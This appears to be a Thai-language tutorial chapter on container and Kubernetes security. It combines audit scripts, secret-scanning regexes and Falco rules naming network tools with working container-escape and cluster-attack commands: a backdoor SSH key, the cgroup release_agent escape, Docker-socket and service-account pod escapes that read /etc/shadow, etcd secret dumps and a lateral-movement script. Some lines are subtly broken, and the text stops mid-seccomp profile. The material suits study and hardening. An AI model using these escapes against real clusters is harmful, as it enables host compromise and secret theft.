# Part 72: Container Security - ความปลอดภัย Docker & Kubernetes

> **ระดับ**: Professional to World-Class | **เวลาเรียน**: 10-14 ชั่วโมง

## สารบัญ
1. [Container Security Fundamentals](#1-container-security-fundamentals)
2. [Docker Security](#2-docker-security)
3. [Container Escape Techniques](#3-container-escape-techniques)
4. [Kubernetes Security](#4-kubernetes-security)
5. [Kubernetes Attack Techniques](#5-kubernetes-attack-techniques)
6. [Container Image Security](#6-container-image-security)
7. [Runtime Security](#7-runtime-security)
8. [Service Mesh Security](#8-service-mesh-security)
9. [Container Security Tools](#9-container-security-tools)
10. [Hardening Checklist](#10-hardening-checklist)

---

## 1. Container Security Fundamentals

### Container Isolation Layers

```
┌───────────────────────────────────────────────┐
│              CONTAINER SECURITY LAYERS              │
├───────────────────────────────────────────────┤
│  Application Layer (app code, dependencies)         │
├───────────────────────────────────────────────┤
│  Container Runtime (Docker, containerd, CRI-O)      │
├───────────────────────────────────────────────┤
│  Linux Kernel (namespaces, cgroups, seccomp)         │
├───────────────────────────────────────────────┤
│  Host Operating System                               │
├───────────────────────────────────────────────┤
│  Hardware/Hypervisor                                 │
└───────────────────────────────────────────────┘

Container Isolation Mechanisms:
- Namespaces: pid, net, ipc, mnt, uts, user
- cgroups: จำกัด CPU, memory, I/O
- seccomp: กรอง system calls
- AppArmor/SELinux: Mandatory Access Control
- Capabilities: สิทธิ์ kernel
```

### Threat Model

```python
#!/usr/bin/env python3
# container_threat_model.py

CONTAINER_THREATS = {
    'Image Threats': [
        'Vulnerabilities in base image',
        'Malicious packages in dependencies',
        'Secrets hardcoded in image layers',
        'Outdated software with known CVEs',
    ],
    'Runtime Threats': [
        'Privileged container breakout',
        'Capability abuse (CAP_SYS_ADMIN)',
        'Volume mount to host filesystem',
        'Network pivoting between containers',
        'Resource exhaustion (CPU/memory DoS)',
    ],
    'Orchestration Threats': [
        'RBAC misconfiguration',
        'etcd data exposure',
        'API server unauthorized access',
        'Node compromise leading to cluster takeover',
        'Service account token abuse',
    ],
    'Supply Chain Threats': [
        'Compromised base images',
        'Tampered CI/CD pipeline',
        'Registry credential theft',
        'Build-time code injection',
    ]
}

for category, threats in CONTAINER_THREATS.items():
    print(f"\n=== {category} ===")
    for i, threat in enumerate(threats, 1):
        print(f"  {i}. {threat}")
```

---

## 2. Docker Security

### Docker Security Audit

```bash
# === ตรวจสอบ Docker daemon configuration ===
# Docker daemon info
docker info
docker version

# ตรวจสอบ daemon socket
ls -la /var/run/docker.sock
# ถ้าเขียน world-writable = CRITICAL!

# ดู containers ที่กำลังรัน
docker ps --format 'table {{.ID}}\t{{.Names}}\t{{.Image}}\t{{.Status}}\t{{.Ports}}'

# ดู images ทั้งหมด
docker images --format 'table {{.Repository}}\t{{.Tag}}\t{{.Size}}\t{{.CreatedAt}}'

# ตรวจสอบ privileged containers
docker ps -q | xargs docker inspect --format '{{ .Name }}: Privileged={{ .HostConfig.Privileged }}'

# ตรวจสอบ containers ที่ mount host paths
docker ps -q | xargs docker inspect --format '{{ .Name }}: Mounts={{ .Mounts }}'

# ตรวจสอบ network mode
docker ps -q | xargs docker inspect --format '{{ .Name }}: NetworkMode={{ .HostConfig.NetworkMode }}'

# ดู capabilities
docker ps -q | xargs docker inspect --format '{{ .Name }}: CapAdd={{ .HostConfig.CapAdd }} CapDrop={{ .HostConfig.CapDrop }}'
```

### Docker Security Script

```python
#!/usr/bin/env python3
# docker_security_audit.py - ตรวจสอบความปลอดภัยของ Docker

import docker
import json
from typing import List, Dict

client = docker.from_env()

def audit_containers() -> List[Dict]:
    """ตรวจสอบความปลอดภัยของทุก container"""
    findings = []
    
    for container in client.containers.list():
        inspect = container.attrs
        host_config = inspect.get('HostConfig', {})
        config = inspect.get('Config', {})
        name = inspect.get('Name', '').lstrip('/')
        
        issues = []
        
        # 1. Privileged mode
        if host_config.get('Privileged', False):
            issues.append({
                'severity': 'CRITICAL',
                'issue': 'Container running in privileged mode',
                'description': 'Privileged container สามารถเข้าถึง host devices และเป็น root บน host'
            })
        
        # 2. Root user
        if config.get('User', '') in ['', '0', 'root']:
            issues.append({
                'severity': 'HIGH',
                'issue': 'Container running as root',
                'description': 'Process runs as root inside container - dangerous if escape occurs'
            })
        
        # 3. Dangerous capabilities
        dangerous_caps = ['CAP_SYS_ADMIN', 'CAP_NET_ADMIN', 'CAP_SYS_PTRACE', 
                         'CAP_SYS_MODULE', 'CAP_DAC_OVERRIDE']
        cap_add = host_config.get('CapAdd', []) or []
        for cap in dangerous_caps:
            if cap in cap_add:
                issues.append({
                    'severity': 'HIGH',
                    'issue': f'Dangerous capability: {cap}',
                    'description': f'{cap} สามารถใช้เพื่อ escape container'
                })
        
        # 4. Host network
        if host_config.get('NetworkMode') == 'host':
            issues.append({
                'severity': 'HIGH',
                'issue': 'Container using host network',
                'description': 'Container สามารถเข้าถึง host network interfaces'
            })
        
        # 5. Host PID namespace
        if host_config.get('PidMode') == 'host':
            issues.append({
                'severity': 'HIGH',
                'issue': 'Container sharing host PID namespace',
                'description': 'Container เห็น host processes และสามารถแก้ไขได้'
            })
        
        # 6. Sensitive volume mounts
        sensitive_paths = ['/etc', '/proc', '/sys', '/var/run/docker.sock', '/']
        for mount in inspect.get('Mounts', []):
            src = mount.get('Source', '')
            dst = mount.get('Destination', '')
            if any(src.startswith(p) for p in sensitive_paths):
                issues.append({
                    'severity': 'CRITICAL',
                    'issue': f'Sensitive host path mounted: {src} -> {dst}',
                    'description': 'Container สามารถอ่าน/เขียน host filesystem'
                })
        
        # 7. No read-only filesystem
        if not host_config.get('ReadonlyRootfs', False):
            issues.append({
                'severity': 'LOW',
                'issue': 'Writable root filesystem',
                'description': 'Container root filesystem เขียนได้ ควรใช้ ReadOnly'
            })
        
        # 8. No resource limits
        if not host_config.get('Memory'):
            issues.append({
                'severity': 'MEDIUM',
                'issue': 'No memory limit set',
                'description': 'Container ไม่มีการจำกัด memory อาจทำให้เกิด DoS'
            })
        
        # 9. Secrets in environment
        env_vars = config.get('Env', []) or []
        sensitive_keys = ['password', 'secret', 'token', 'key', 'credential']
        for env in env_vars:
            key = env.split('=')[0].lower()
            if any(s in key for s in sensitive_keys):
                value = env.split('=', 1)[1] if '=' in env else ''
                issues.append({
                    'severity': 'HIGH',
                    'issue': f'Potential secret in env var: {key}',
                    'description': f'Value: {value[:20]}...'
                })
        
        if issues:
            findings.append({
                'container': name,
                'image': config.get('Image', ''),
                'issues': issues
            })
    
    return findings

def print_audit_report(findings: List[Dict]):
    print("\n" + "="*60)
    print("         DOCKER SECURITY AUDIT REPORT")
    print("="*60)
    
    total_issues = sum(len(f['issues']) for f in findings)
    print(f"Containers audited: {len(client.containers.list())}")
    print(f"Total issues found: {total_issues}")
    
    severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
    for finding in findings:
        for issue in finding['issues']:
            severity_counts[issue['severity']] = severity_counts.get(issue['severity'], 0) + 1
    
    for sev, count in severity_counts.items():
        if count:
            print(f"  {sev}: {count}")
    
    print()
    for finding in findings:
        print(f"\n[Container: {finding['container']}] ({finding['image']})")
        for issue in finding['issues']:
            prefix = {'CRITICAL': '[!!!]', 'HIGH': '[!]', 'MEDIUM': '[*]', 'LOW': '[-]'}.get(issue['severity'], '[?]')
            print(f"  {prefix} {issue['severity']}: {issue['issue']}")
            print(f"      {issue['description']}")

if __name__ == '__main__':
    findings = audit_containers()
    print_audit_report(findings)
```

### Dockerfile Security Analysis

```bash
# Dockerfile analysis script
cat > /tmp/analyze_dockerfile.sh << 'SCRIPT'
#!/bin/bash
DOCKERFILE=${1:-Dockerfile}

echo "=== Dockerfile Security Analysis: $DOCKERFILE ==="

# ตรวจสอบ USER instruction
if ! grep -q '^USER' "$DOCKERFILE"; then
    echo "[HIGH] No USER instruction - container will run as root"
else
    USER_VAL=$(grep '^USER' "$DOCKERFILE" | tail -1 | awk '{print $2}')
    if [ "$USER_VAL" = "root" ] || [ "$USER_VAL" = "0" ]; then
        echo "[HIGH] USER is explicitly set to root"
    else
        echo "[OK] Non-root user: $USER_VAL"
    fi
fi

# ตรวจสอบ ADD vs COPY
if grep -q '^ADD' "$DOCKERFILE"; then
    echo "[MEDIUM] Using ADD instead of COPY - ADD can extract archives and fetch URLs"
fi

# ตรวจสอบ HEALTHCHECK
if ! grep -q '^HEALTHCHECK' "$DOCKERFILE"; then
    echo "[LOW] No HEALTHCHECK defined"
fi

# ตรวจสอบ hardcoded secrets
if grep -qiE '(password|secret|token|key|api_key)\s*=\s*[^$]' "$DOCKERFILE"; then
    echo "[CRITICAL] Potential hardcoded secrets found!"
    grep -niE '(password|secret|token|key|api_key)\s*=' "$DOCKERFILE"
fi

# ตรวจสอบ latest tag
if grep -q ':latest' "$DOCKERFILE"; then
    echo "[MEDIUM] Using :latest tag - not reproducible"
fi

# ตรวจสอบ FROM scratch หรือ distroless
FROM_IMG=$(grep '^FROM' "$DOCKERFILE" | tail -1)
echo "[INFO] Base image: $FROM_IMG"

# curl/wget ใน RUN
if grep -qE '^RUN.*(curl|wget)' "$DOCKERFILE"; then
    echo "[INFO] Network downloads in RUN instruction - verify sources"
fi

echo "\nAnalysis complete."
SCRIPT
chmod +x /tmp/analyze_dockerfile.sh
/tmp/analyze_dockerfile.sh Dockerfile
```

---

## 3. Container Escape Techniques

### Technique 1: Privileged Container Escape

```bash
# ถ้าเราอยู่ใน privileged container:
docker run --privileged -it ubuntu bash

# เช็คว่าเราอยู่ใน container
cat /proc/1/cgroup
# ถ้าเห็น docker/kubepods = อยู่ใน container

# ===== Method 1: Mount host filesystem via device =====
# ได้รับ block devices แล้ว
fdisk -l 2>/dev/null | grep -E '^Disk /dev'
# สมมติว่าเห็น /dev/sda1

mkdir /tmp/hostfs
mount /dev/sda1 /tmp/hostfs
ls /tmp/hostfs  # เห็น host filesystem!

# อ่าน SSH keys ของ host
cat /tmp/hostfs/root/.ssh/id_rsa

# เพิ่ม backdoor SSH key
echo 'ssh-rsa AAAA...your-public-key...' >> /tmp/hostfs/root/.ssh/authorized_keys

# ===== Method 2: cgroup release_agent escape =====
# (CVE-2022-0492 / classic escape technique)

# สร้าง cgroup ใหม่
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# หา host path ของ container
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# เขียน payload
echo "#!/bin/sh" > /tmp/cmd
echo "id > ${host_path}/output" >> /tmp/cmd
chmod a+x /tmp/cmd
echo "${host_path}/cmd" > /tmp/cgrp/release_agent

# Trigger
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# ดูผลลัพธ์
cat /output
# uid=0(root) gid=0(root) groups=0(root)  <-- เป็น host root!
```

### Technique 2: Docker Socket Escape

```bash
# ถ้ามี docker.sock mount
ls -la /var/run/docker.sock
curl -s --unix-socket /var/run/docker.sock http://localhost/version

# สร้าง container ใหม่ที่ mount host /
curl -s -X POST --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{
    "Image": "alpine",
    "Cmd": ["/bin/sh", "-c", "id && cat /host/etc/shadow"],
    "HostConfig": {
      "Binds": ["/:/host"],
      "Privileged": true
    }
  }' \
  http://localhost/containers/create?name=escape-container

# Start container
curl -s -X POST --unix-socket /var/run/docker.sock \
  http://localhost/containers/escape-container/start

# ดู logs
curl -s --unix-socket /var/run/docker.sock \
  http://localhost/containers/escape-container/logs?stdout=1

# Python version
python3 - << 'EOF'
import docker
client = docker.DockerClient(base_url='unix://var/run/docker.sock')

# Create privileged container with host mount
container = client.containers.run(
    'alpine',
    command='cat /host/etc/shadow',
    volumes={'/': {'bind': '/host', 'mode': 'rw'}},
    privileged=True,
    remove=True
)
print(container.decode())
EOF
```

### Technique 3: Capability Abuse

```bash
# ดู capabilities ที่มี
capsh --print
# Current: = cap_chown,cap_dac_override,...

# CAP_SYS_PTRACE - แนบ process บน host
capability: CAP_SYS_PTRACE
# สามารถ inject code เข้า host process
python3 -c "import ctypes; ctypes.CDLL('libc.so.6').ptrace(0, 1, 0, 0)"

# CAP_NET_ADMIN - แก้ไข network rules
ip link add dummy0 type dummy  # สร้าง virtual interface
iptables -A OUTPUT -j DROP      # block traffic!

# CAP_SYS_ADMIN - สร้างได้ทั้งหมด
mount -t proc proc /proc         # remount procfs
unshare --map-root-user --user sh -c whoami  # user namespace escape

# CAP_DAC_READ_SEARCH - อ่านไฟล์ทั้งหมด
cat /etc/shadow  # อ่านไฟล์ที่ปกติไม่สามารถอ่าน
open('/etc/shadow')  # ด้วย Python
```

### Technique 4: Kubernetes Service Account Escape

```bash
# ภายใน pod: ใช้ service account token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# เข้าถึง K8s API
curl -sk --cacert $CA_CERT \
  -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/secrets

# ถ้ามีสิทธิ์ create pods:
curl -sk --cacert $CA_CERT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST \
  https://kubernetes.default.svc/api/v1/namespaces/$NAMESPACE/pods \
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "escape-pod"},
    "spec": {
      "containers": [{
        "name": "escape",
        "image": "ubuntu",
        "command": ["/bin/bash", "-c", "cat /host/etc/shadow"],
        "volumeMounts": [{"name": "host", "mountPath": "/host"}]
      }],
      "volumes": [{"name": "host", "hostPath": {"path": "/"}}]
    }
  }'
```

---

## 4. Kubernetes Security

### Kubernetes Security Assessment

```bash
# kube-bench - CIS Kubernetes Benchmark
docker run --rm --pid=host \
  -v /etc:/etc:ro \
  -v /var:/var:ro \
  -v /proc:/proc:ro \
  -v $(which kubectl):/usr/local/mount-from-host/bin/kubectl:ro \
  -e KUBECONFIG=$KUBECONFIG \
  aquasec/kube-bench:latest

# หรือรันบน node
kube-bench run --targets master  # บน control plane
kube-bench run --targets node    # บน worker node

# kube-hunter - Kubernetes penetration testing
docker run -it --rm aquasec/kube-hunter
# เลือก: Remote scanning
# ใส่: IP address ของ cluster

# หรือรันแบบ pod
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-hunter/main/job.yaml
kubectl logs job/kube-hunter
```

### Kubernetes RBAC Audit

```python
#!/usr/bin/env python3
# k8s_rbac_audit.py - ตรวจสอบ RBAC misconfiguration

from kubernetes import client, config
import json

config.load_kube_config()  # หรือ load_incluster_config()

rbac_api = client.RbacAuthorizationV1Api()
core_api = client.CoreV1Api()

def find_overprivileged_roles():
    """ค้นหา roles ที่มีสิทธิ์สูง"""
    dangerous_permissions = [
        ('*', '*'),          # สิทธิ์ทุกอย่าง
        ('pods/exec', '*'),  # exec เข้า pods
        ('secrets', '*'),    # อ่าน secrets
        ('clusterroles', 'bind'),  # bind เพิ่ม roles
    ]
    
    findings = []
    
    # ClusterRoles
    cluster_roles = rbac_api.list_cluster_role().items
    for role in cluster_roles:
        if role.metadata.name.startswith('system:'):
            continue  # ข้าม built-in roles
        
        for rule in (role.rules or []):
            verbs = rule.verbs or []
            resources = rule.resources or []
            
            if '*' in verbs and '*' in resources:
                findings.append({
                    'type': 'ClusterRole',
                    'name': role.metadata.name,
                    'issue': 'Wildcard permissions (*.*)',
                    'severity': 'CRITICAL'
                })
            elif 'pods' in resources and 'exec' in verbs:
                findings.append({
                    'type': 'ClusterRole',
                    'name': role.metadata.name,
                    'issue': 'Can exec into pods',
                    'severity': 'HIGH'
                })
            elif 'secrets' in resources and any(v in verbs for v in ['get', 'list', '*']):
                findings.append({
                    'type': 'ClusterRole',
                    'name': role.metadata.name,
                    'issue': 'Can read secrets',
                    'severity': 'HIGH'
                })
    
    return findings

def find_sensitive_bindings():
    """ค้นหา role bindings ที่น่าสงสัย"""
    findings = []
    
    # ClusterRoleBindings สำหรับ cluster-admin
    bindings = rbac_api.list_cluster_role_binding().items
    for binding in bindings:
        if binding.role_ref.name == 'cluster-admin':
            for subject in (binding.subjects or []):
                findings.append({
                    'binding': binding.metadata.name,
                    'role': 'cluster-admin',
                    'subject_kind': subject.kind,
                    'subject_name': subject.name,
                    'namespace': subject.namespace,
                    'severity': 'CRITICAL' if subject.kind == 'ServiceAccount' else 'HIGH'
                })
    
    return findings

def find_privileged_service_accounts():
    """ค้นหา service accounts ที่มีสิทธิ์สูง"""
    # ใช้ enumerate_iam approach สำหรับ K8s
    sa_with_high_perms = []
    
    namespaces = [ns.metadata.name for ns in core_api.list_namespace().items]
    
    for ns in namespaces:
        service_accounts = core_api.list_namespaced_service_account(ns).items
        for sa in service_accounts:
            # ตรวจสอบว่า SA นี้มี cluster-admin binding หรือไม่
            bindings = rbac_api.list_cluster_role_binding().items
            for binding in bindings:
                for subject in (binding.subjects or []):
                    if (subject.kind == 'ServiceAccount' and
                        subject.name == sa.metadata.name and
                        subject.namespace == ns and
                        binding.role_ref.name in ['cluster-admin', 'admin']):
                        sa_with_high_perms.append({
                            'sa': f"{ns}/{sa.metadata.name}",
                            'bound_role': binding.role_ref.name,
                            'via_binding': binding.metadata.name
                        })
    
    return sa_with_high_perms

if __name__ == '__main__':
    print("=== Kubernetes RBAC Security Audit ===")
    
    print("\n[*] Overprivileged Roles:")
    roles = find_overprivileged_roles()
    for r in roles:
        print(f"  [{r['severity']}] {r['type']}/{r['name']}: {r['issue']}")
    
    print("\n[*] Sensitive Role Bindings:")
    bindings = find_sensitive_bindings()
    for b in bindings:
        print(f"  [{b['severity']}] {b['subject_kind']}/{b['subject_name']} has {b['role']} via {b['binding']}")
    
    print("\n[*] Privileged Service Accounts:")
    sa = find_privileged_service_accounts()
    for s in sa:
        print(f"  [HIGH] {s['sa']} -> {s['bound_role']} (via {s['via_binding']})")
```

---

## 5. Kubernetes Attack Techniques

### etcd Attack

```bash
# etcd เก็บทุกอย่างใน cluster รวมถึง secrets!

# ถ้าเข้าถึง etcd ได้:
etcdctl \
  --endpoints https://127.0.0.1:2379 \
  --cacert /etc/kubernetes/pki/etcd/ca.crt \
  --cert /etc/kubernetes/pki/etcd/server.crt \
  --key /etc/kubernetes/pki/etcd/server.key \
  get / --prefix --keys-only

# ดู secrets ทั้งหมด
etcdctl \
  --endpoints https://127.0.0.1:2379 \
  --cacert /etc/kubernetes/pki/etcd/ca.crt \
  --cert /etc/kubernetes/pki/etcd/server.crt \
  --key /etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets --prefix | strings

# ดู secret เฉพาะ
etcdctl \
  --endpoints https://127.0.0.1:2379 \
  --cacert /etc/kubernetes/pki/etcd/ca.crt \
  --cert /etc/kubernetes/pki/etcd/server.crt \
  --key /etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets/kube-system/bootstrap-token-xxx | strings

# etcd ที่ไม่มี authentication (ถ้าเจอ):
etcdctl --endpoints http://target:2379 get / --prefix --keys-only
```

### Kubernetes Lateral Movement

```python
#!/usr/bin/env python3
# k8s_lateral_movement.py

from kubernetes import client, config
import subprocess
import base64

class K8sLateralMovement:
    def __init__(self):
        config.load_kube_config()
        self.core = client.CoreV1Api()
        self.apps = client.AppsV1Api()
    
    def find_accessible_secrets(self) -> list:
        """ค้นหา secrets ที่เข้าถึงได้"""
        accessible = []
        namespaces = [ns.metadata.name for ns in self.core.list_namespace().items]
        
        for ns in namespaces:
            try:
                secrets = self.core.list_namespaced_secret(ns).items
                for secret in secrets:
                    if secret.data:
                        secret_info = {
                            'namespace': ns,
                            'name': secret.metadata.name,
                            'type': secret.type,
                            'data_keys': list(secret.data.keys())
                        }
                        # ถอดรหัสและดูข้อมูล
                        for key, value in secret.data.items():
                            try:
                                decoded = base64.b64decode(value).decode('utf-8', errors='replace')
                                secret_info[f'decoded_{key}'] = decoded[:100]
                            except Exception:
                                pass
                        accessible.append(secret_info)
            except client.exceptions.ApiException:
                pass  # ไม่มี permission
        
        return accessible
    
    def find_pods_with_service_accounts(self) -> list:
        """ค้นหา pods ที่ใช้ service accounts ที่น่าสนใจ"""
        interesting_pods = []
        namespaces = [ns.metadata.name for ns in self.core.list_namespace().items]
        
        interesting_sa = ['admin', 'system', 'default', 'jenkins', 'deploy', 'ci']
        
        for ns in namespaces:
            try:
                pods = self.core.list_namespaced_pod(ns).items
                for pod in pods:
                    sa = pod.spec.service_account_name or 'default'
                    if any(name in sa.lower() for name in interesting_sa):
                        interesting_pods.append({
                            'namespace': ns,
                            'pod': pod.metadata.name,
                            'service_account': sa,
                            'node': pod.spec.node_name
                        })
            except client.exceptions.ApiException:
                pass
        
        return interesting_pods
    
    def exec_in_pod(self, namespace: str, pod_name: str, command: str) -> str:
        """รันคำสั่งใน pod"""
        try:
            result = subprocess.run(
                ['kubectl', 'exec', '-n', namespace, pod_name, '--', 'sh', '-c', command],
                capture_output=True, text=True, timeout=30
            )
            return result.stdout
        except Exception as e:
            return f"Error: {e}"
    
    def pivot_through_pod(self, namespace: str, pod_name: str) -> dict:
        """ใช้ pod เป็น pivot point"""
        results = {}
        
        # ดู environment variables
        results['env'] = self.exec_in_pod(namespace, pod_name, 'env')
        
        # ตรวจสอบ mounted secrets
        results['secrets'] = self.exec_in_pod(namespace, pod_name, 'cat /var/run/secrets/kubernetes.io/serviceaccount/token')
        
        # สแกน network
        results['network'] = self.exec_in_pod(namespace, pod_name, 'ip addr && netstat -tunlp 2>/dev/null')
        
        # ค้นหา other services
        results['services'] = self.exec_in_pod(namespace, pod_name, 
            'for port in 80 443 8080 8443 3000 5432 3306 6379 9200; do nc -z -w1 kubernetes.default.svc $port 2>/dev/null && echo "K8s API:$port open"; done')
        
        return results

if __name__ == '__main__':
    km = K8sLateralMovement()
    
    print("[*] Finding accessible secrets...")
    secrets = km.find_accessible_secrets()
    print(f"[*] Found {len(secrets)} accessible secrets")
    for s in secrets[:5]:  # แสดงแค่ 5 อันแรก
        print(f"  {s['namespace']}/{s['name']} ({s['type']})")
    
    print("\n[*] Finding interesting pods...")
    pods = km.find_pods_with_service_accounts()
    for p in pods:
        print(f"  Pod: {p['namespace']}/{p['pod']} SA: {p['service_account']}")
```

---

## 6. Container Image Security

### Image Vulnerability Scanning

```bash
# Trivy - สแกน container images
apt install trivy

# สแกน image
trivy image ubuntu:20.04
trivy image --severity HIGH,CRITICAL nginx:latest
trivy image --format json nginx:latest > /tmp/nginx-vulns.json

# สแกน Dockerfile
trivy config Dockerfile
trivy config k8s/

# สแกน image ใน registry
trivy registry registry.company.com/app:latest

# Grype - อีก vulnerability scanner
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh
grype ubuntu:latest
grype dir:/path/to/app

# Dive - วิเคราะห์ image layers
snap install dive
dive ubuntu:20.04
# ดูแต่ละ layer และไฟล์ที่เปลี่ยนแปลง

# Docker Slim - อ่านข้อมูล image layers
docker history --no-trunc my-image:latest
docker save my-image:latest | tar xv -C /tmp/image-layers

# ค้นหาไฟล์ที่ลบใน layers
for layer in /tmp/image-layers/*/; do
    tar xf "${layer}layer.tar" -C /tmp/extracted 2>/dev/null
done
find /tmp/extracted -name '*.env' -o -name '*.key' -o -name '*.pem' 2>/dev/null
```

### Secret Scanning in Images

```python
#!/usr/bin/env python3
# image_secret_scanner.py - สแกนหา secrets ใน Docker images

import subprocess
import os
import re
import json
import tarfile
import tempfile
from pathlib import Path

SECRET_PATTERNS = [
    (r'AKIA[0-9A-Z]{16}', 'AWS Access Key ID', 'CRITICAL'),
    (r'[0-9a-zA-Z/+]{40}', 'Possible AWS Secret Key', 'HIGH'),
    (r'sk-[a-zA-Z0-9]{48}', 'OpenAI API Key', 'CRITICAL'),
    (r'ghp_[a-zA-Z0-9]{36}', 'GitHub Personal Access Token', 'CRITICAL'),
    (r'-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----', 'Private Key', 'CRITICAL'),
    (r'password\s*=\s*[\'"]?[^\'"]', 'Hardcoded Password', 'HIGH'),
    (r'secret\s*=\s*[\'"]?[^\'"]', 'Hardcoded Secret', 'HIGH'),
    (r'api[_-]?key\s*=\s*[\'"]?[^\'"]', 'API Key', 'HIGH'),
    (r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*', 'JWT Token', 'MEDIUM'),
    (r'mysql://[^\s]+', 'MySQL Connection String', 'HIGH'),
    (r'postgresql://[^\s]+', 'PostgreSQL Connection String', 'HIGH'),
    (r'mongodb://[^\s]+', 'MongoDB Connection String', 'HIGH'),
]

TEXT_EXTENSIONS = {
    '.py', '.js', '.ts', '.rb', '.go', '.java', '.php',
    '.env', '.yaml', '.yml', '.json', '.toml', '.ini', '.cfg', '.conf',
    '.sh', '.bash', '.zsh', '.ps1',
    '.txt', '.md', '.log',
    '.pem', '.key', '.crt', '.cer',
}

class ImageSecretScanner:
    def __init__(self, image_name: str):
        self.image_name = image_name
        self.findings = []
    
    def extract_image(self) -> str:
        """แตก image ออกเป็น filesystem"""
        temp_dir = tempfile.mkdtemp(prefix='image_scan_')
        image_tar = os.path.join(temp_dir, 'image.tar')
        extracted_dir = os.path.join(temp_dir, 'extracted')
        os.makedirs(extracted_dir)
        
        print(f"[*] Saving image {self.image_name}...")
        subprocess.run(['docker', 'save', self.image_name, '-o', image_tar], 
                      capture_output=True)
        
        print("[*] Extracting layers...")
        with tarfile.open(image_tar) as tar:
            tar.extractall(extracted_dir)
        
        # แต่ละ layer
        layer_dir = os.path.join(temp_dir, 'layers')
        os.makedirs(layer_dir)
        
        for root, dirs, files in os.walk(extracted_dir):
            for f in files:
                if f == 'layer.tar':
                    with tarfile.open(os.path.join(root, f)) as lt:
                        try:
                            lt.extractall(layer_dir)
                        except Exception:
                            pass
        
        return layer_dir
    
    def scan_file(self, filepath: str) -> list:
        """สแกนไฟล์หา secrets"""
        file_findings = []
        
        ext = Path(filepath).suffix.lower()
        if ext not in TEXT_EXTENSIONS:
            return file_findings
        
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                for line_num, line in enumerate(content.split('\n'), 1):
                    for pattern, name, severity in SECRET_PATTERNS:
                        if re.search(pattern, line, re.IGNORECASE):
                            file_findings.append({
                                'file': filepath,
                                'line': line_num,
                                'pattern': name,
                                'severity': severity,
                                'snippet': line[:100].strip()
                            })
        except Exception:
            pass
        
        return file_findings
    
    def scan(self) -> list:
        layer_dir = self.extract_image()
        
        print("[*] Scanning for secrets...")
        for root, dirs, files in os.walk(layer_dir):
            # ข้าม dirs ที่ไม่น่าสนใจ
            dirs[:] = [d for d in dirs if d not in ['proc', 'sys', 'dev', 'run']]
            
            for f in files:
                filepath = os.path.join(root, f)
                findings = self.scan_file(filepath)
                self.findings.extend(findings)
        
        return self.findings

if __name__ == '__main__':
    scanner = ImageSecretScanner('my-app:latest')
    findings = scanner.scan()
    
    if findings:
        print(f"\n[!] Found {len(findings)} potential secrets!\n")
        for f in findings:
            print(f"[{f['severity']}] {f['pattern']}")
            print(f"  File: {f['file']}:{f['line']}")
            print(f"  Snippet: {f['snippet']}\n")
    else:
        print("[+] No secrets found in image")
```

---

## 7. Runtime Security

### Falco - Runtime Threat Detection

```bash
# ติดตั้ง Falco
curl -s https://falco.org/repo/falcosecurity-packages.asc | apt-key add -
add-apt-repository 'deb https://download.falco.org/packages/deb stable main'
apt install falco -y

# รัน Falco
systemctl start falco
journalctl -fu falco  # ดู real-time alerts

# ตัวอย่าง Falco rules (YAML)
cat > /etc/falco/rules.d/custom.yaml << 'EOF'
- rule: Container running as root
  desc: Container running as root user
  condition: container and proc.sname = "bash" and user.uid = 0 and not container.privileged
  output: "Root bash in container (container=%container.name image=%container.image.repository pid=%proc.pid)"
  priority: WARNING

- rule: Sensitive file accessed
  desc: Access to sensitive file in container
  condition: >
    open_read and container and
    fd.name in (/etc/shadow, /etc/passwd, /etc/sudoers)
  output: "Sensitive file read (file=%fd.name container=%container.name user=%user.name)"
  priority: ERROR

- rule: Spawning Shell in Container
  desc: Shell spawned inside container
  condition: >
    spawned_process and container and
    proc.name in (bash, sh, zsh, fish)
  output: "Shell spawned (shell=%proc.name container=%container.name user=%user.name args=%proc.args)"
  priority: NOTICE

- rule: Network tool launched in container
  desc: Network scanning tool launched
  condition: >
    spawned_process and container and
    proc.name in (nmap, netcat, nc, ncat, socat, wget, curl)
  output: "Network tool launched (tool=%proc.name container=%container.name user=%user.name)"
  priority: WARNING
EOF

falco --validate /etc/falco/rules.d/custom.yaml
systemctl restart falco
```

### AppArmor and Seccomp Profiles

```bash
# === AppArmor ===
# เขียน AppArmor profile
cat > /etc/apparmor.d/docker-restricted << 'EOF'
#include <tunables/global>

profile docker-restricted flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>
  
  # อนุญาตไฟล์ที่จำเป็น
  /lib/x86_64-linux-gnu/** mr,
  /usr/lib/x86_64-linux-gnu/** mr,
  /bin/* ix,
  /usr/bin/* ix,
  
  # ป๎ิเสธไม่ให้เข้าถึงไฟล์สำคัญ
  deny /etc/shadow r,
  deny /etc/passwd r,
  deny /proc/sysrq-trigger rw,
  
  # Network
  network,
  
  # ป๎ิเสธ raw sockets
  deny network raw,
  deny network packet,
}
EOF

apparmor_parser -r /etc/apparmor.d/docker-restricted

# ใช้กับ Docker
docker run --security-opt apparmor=docker-restricted ubuntu bash

# === Seccomp ===
# Seccomp profile
cat > /tmp/seccomp-restricted.json << 'EOF'
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "names": [
